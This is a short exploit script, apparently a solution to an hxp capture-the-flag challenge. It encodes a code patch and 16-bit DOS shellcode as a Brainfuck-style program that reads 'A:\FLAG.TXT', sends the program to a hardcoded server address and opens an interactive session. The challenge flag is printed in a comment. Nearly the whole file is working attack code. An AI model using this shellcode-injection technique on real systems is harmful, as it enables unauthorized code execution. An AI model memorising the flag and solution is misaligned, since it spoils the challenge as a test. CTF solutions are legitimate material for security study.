from pwnlib import *

# hxp{ju57 l1k3 4 7ur1n6 m4ch1n3 bu7 w17h l1m173d 5p4c3}

program  = ""

# first fix up the cd 21 -> 50 58 (push/pop pair)
program += "<<" + "-"*(0xcd - 0x50) + ">" + "+"*(0x58 - 0x21) + ">"

# then emplace our own shellcode
shellcode = assemble("""
BITS 16

; open file 
mov dx, bp
mov ah, 0x3d
mov al, 0
int 0x21

jnc all_fine
error:
mov dl, 'E'
mov ah, 2
int 0x21

exit:
mov ah, 0x4c
int 0x21

all_fine:

; read from file
mov bx, ax
mov ah, 0x3f
mov cx, 0x90
mov dx, 0x100
int 0x21


xor di, di
loop:

mov bx, 0x100
mov dl, [bx+di]
mov ah, 2
int 0x21

inc di
cmp di, 55
jne loop

; exit
mov ah, 0x4c
int 0x21

""", "x86")

flagname = "A:\\FLAG.TXT\x00"
shellcode += flagname

for c in shellcode:
	c = ord(c)
	program += "+"*c + ">"

for c in range(len(flagname)):
	program += "<"


program = program.replace("\n", "").replace(" ", "")



s = Socket(("130.211.155.146", 20666))
s.send(program + "\n")
s.interact()

